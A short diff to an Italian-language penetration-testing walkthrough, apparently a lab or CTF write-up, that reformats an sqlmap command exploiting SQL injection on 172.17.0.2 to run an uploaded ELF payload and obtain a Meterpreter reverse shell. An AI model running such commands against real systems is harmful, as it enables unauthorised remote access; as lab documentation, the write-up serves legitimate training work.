@@ -213,8 +213,7 @@ e che il server web è basato su `Apache 2.4.18, PHP, Linux Ubuntu 16.04/16.10`
 
 - In un altro terminale Kali usiamo sqlmap per eseguire la shell:
     ```
-    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" \
-        --batch --os-cmd '/var/lib/mysql/shell.elf'
+    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" --os-cmd '/var/lib/mysql/shell.elf'
     ```
 - Otteniamo la reverse shell Meterpreter, possiamo chiudere la shell di sqlmap tenendo aperto il terminale Kali.
 
